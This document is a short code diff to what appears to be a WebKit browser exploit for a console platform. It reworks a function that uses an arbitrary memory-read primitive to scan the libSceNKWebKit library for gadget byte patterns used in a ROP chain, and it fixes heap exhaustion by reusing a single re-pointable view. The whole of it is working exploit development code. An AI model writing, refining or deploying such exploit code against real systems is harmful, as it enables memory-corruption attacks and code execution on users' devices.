@@ -224,17 +224,21 @@ async function prepare(p) {
     // `mov [rdi],rax`, the classic pop-rax chain works without libkernel.
     let rawSyscall = false;
     function scanWkPat(pat) {
-        const CHUNK = 0x2000, TOTAL = 0x2c7c000;
+        const CHUNK = 0x4000, TOTAL = 0x2c7c000, OVER = 16;
+        // ONE reusable window: array_from_address() gives a view whose setAddr()
+        // re-points it. Calling it per chunk allocated ~5600 Uint8Arrays pinned
+        // in nogc -> WebKit heap exhaustion ("not enough free memory") right
+        // after the primitive settled.
+        let view;
+        try { view = array_from_address(libSceNKWebKitBase.add32(0), CHUNK + OVER); }
+        catch (e) { return null; }
         for (let off = 0; off < TOTAL; off += CHUNK) {
-            let view;
-            try {
-                view = array_from_address(libSceNKWebKitBase.add32(off),
-                    Math.min(CHUNK + 16, TOTAL - off));
-            } catch (e) { continue; }
-            let n = 0;
-            try { n = view.length; } catch (e) { n = 0; }
+            const window = Math.min(CHUNK + OVER, TOTAL - off);
+            const scanLen = Math.min(CHUNK, TOTAL - off);
+            try { view.setAddr(libSceNKWebKitBase.add32(off), window); }
+            catch (e) { continue; }
             outer:
-            for (let i = 0; i + pat.length <= n; i++) {
+            for (let i = 0; i + pat.length <= scanLen; i++) {
                 for (let j = 0; j < pat.length; j++)
                     if ((view[i + j] & 0xff) !== pat[j]) continue outer;
                 return libSceNKWebKitBase.add32(off + i);
